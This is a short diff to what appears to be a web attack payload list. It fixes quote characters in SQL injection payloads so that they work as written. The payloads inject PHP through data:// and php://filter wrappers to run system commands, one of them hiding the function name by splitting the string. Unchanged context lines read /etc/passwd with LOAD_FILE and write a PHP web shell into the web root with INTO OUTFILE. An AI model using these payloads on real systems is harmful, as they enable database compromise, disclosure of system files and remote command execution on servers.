@@ -174,9 +174,9 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 - Advanced SQL Injection payloads
 
 ```txt
-' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -
-' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?>’ -- -
-’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
+' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php echo system("uname -a");?>'-- -
+' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php $a="sy";$b="stem";$c=$a.$b; $c("uname -a");?>' -- -
+’ /*!50000union*/ select 1,2,3,4,5,'../index',7,8,'php://filter/convert.base64-encode/resource=.' -- -
 admin' and (select * from(select(sleep(40)))SQLI) and 'abc' = 'ab
 -1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,LOAD_FILE('/etc/passwd'),NULL;#
 -1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,"<?php echo shell_exec($_REQUEST['cmd']);?>",NULL INTO OUTFILE '/var/www/html/c.php';#
